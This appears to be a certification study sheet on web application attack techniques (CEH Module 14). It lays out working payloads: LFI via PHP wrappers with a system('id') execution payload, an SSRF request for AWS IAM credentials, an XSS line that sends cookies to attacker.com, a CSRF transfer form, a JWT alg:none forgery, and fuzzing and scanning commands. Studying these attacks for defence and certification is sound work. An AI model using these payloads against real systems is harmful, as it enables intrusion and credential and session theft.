# 02. Attack Techniques — Hacking Web Applications

> [!WARNING] ⚡ **Exploitation Methodologies & Execution Scenarios**
> Direct extraction from official CEH v13 Syllabus (Module 14). Covers CSRF PoC Generation, LFI to RCE PHP Wrappers, SSRF AWS Metadata Exploitation, JWT Token `alg: none` Bypass, and Directory Fuzzing commands.

---

## ⚔️ 1. Primary Exploitation Workflows

### 1.1 LFI to Base64 Source Disclosure & RCE via PHP Wrappers
Attackers use PHP stream wrappers to bypass input filters and read source code or execute code:

```http
# 1. Base64 encode source code disclosure via LFI
GET /index.php?page=php://filter/read=convert.base64-encode/resource=config.php HTTP/1.1

# 2. Remote Code Execution via php://input
POST /index.php?page=php://input HTTP/1.1
Host: target.com

<?php system('id'); ?>
```

### 1.2 SSRF Cloud Metadata Exfiltration Workflow
In cloud environments (AWS, GCP, Azure), SSRF allows attackers to query the internal Link-Local Metadata Address (`169.254.169.254`):

```http
# AWS IAM Secret Key Exfiltration via SSRF
GET /fetch.php?url=http://169.254.169.254/latest/meta-data/iam/security-credentials/AdminRole HTTP/1.1
```

> [!DANGER] 🛡️ **📋 Comprehensive Web Application Exploitation Reference Matrix**

| Attack Scenario | Vulnerable Input | Command / Payload Syntax | Operational Impact |
| :--- | :--- | :--- | :--- |
| **Reflected XSS** | Search Parameter | `<script>fetch('http://attacker.com/?c='+document.cookie)</script>` | Exfiltrates session cookies |
| **CSRF Auto-Post** | Missing CSRF token | `<form action="http://bank.com/transfer" method="POST">...` | Executes unauthorized money transfer |
| **SSRF Metadata** | URL fetcher parameter | `url=http://169.254.169.254/latest/meta-data/` | Steals AWS IAM access keys |
| **JWT `alg: none`** | Authorization Header | `{"alg":"none","typ":"JWT"}.{"user":"admin"}.` | Bypasses JWT signature check |

---

## 🛡️ 2. Tool Execution CLI Syntax

```bash
# 1. Web Directory Fuzzing via Ffuf
ffuf -u http://192.168.1.50/FUZZ -w /usr/share/wordlists/dirb/common.txt -e .php,.html,.txt

# 2. Web Directory Fuzzing via Gobuster
gobuster dir -u http://192.168.1.50 -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 50

# 3. Web Vulnerability Scanning via Nuclei
nuclei -u http://192.168.1.50 -t vulnerabilities/
```
